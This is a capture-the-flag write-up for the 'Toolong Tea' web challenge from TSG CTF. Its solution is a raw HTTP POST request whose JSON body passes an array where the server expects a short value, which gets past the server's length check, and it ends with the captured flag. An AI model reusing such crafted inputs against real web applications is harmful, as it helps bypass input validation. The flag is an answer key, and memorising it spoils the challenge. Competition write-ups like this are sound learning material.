# Toolong Tea

Solved by: @yappare

## Question:
Recently it's getting colder in Tokyo which TSG is based in. Would you like to have a cup of hot oolong tea? It will warm up your body.

## Solution:
```
POST / HTTP/1.1
Host: 34.84.32.212:4932
Content-Length: 25
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://34.84.32.212:4932
Referer: http://34.84.32.212:4932/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"num":["65536","1","1"]}
```

**Flag:** `TSGCTF{A_holy_night_with_no_dawn_my_dear...}`
